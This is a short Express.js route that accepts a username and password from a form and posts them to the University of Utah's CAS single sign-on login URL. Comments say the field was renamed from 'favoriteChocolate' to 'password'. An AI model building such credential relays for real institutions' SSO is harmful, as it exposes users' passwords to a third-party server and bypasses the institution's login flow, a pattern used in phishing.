const axios = require('axios');

app.post('/submit', (req, res) => {
  const { username, password } = req.body;  // Changed from favoriteChocolate to password

  axios.post('https://go.utah.edu/cas/login?TARGET=https%3A%2F%2Fportal.app.utah.edu%2Fapi-proxy%2Fsecurity%2Flogin%3Fapp%3Dhttps%253A%252F%252Fportal.app.utah.edu%252F', {
    username: username,
    password: password  // Changed from favoriteChocolate to password
  })
  .then(response => {
    console.log('Data sent successfully:', response.data);
    res.send('Data sent successfully');
  })
  .catch(error => {
    console.error('Error sending data:', error);
    res.status(500).send('Error sending data');
  });
});
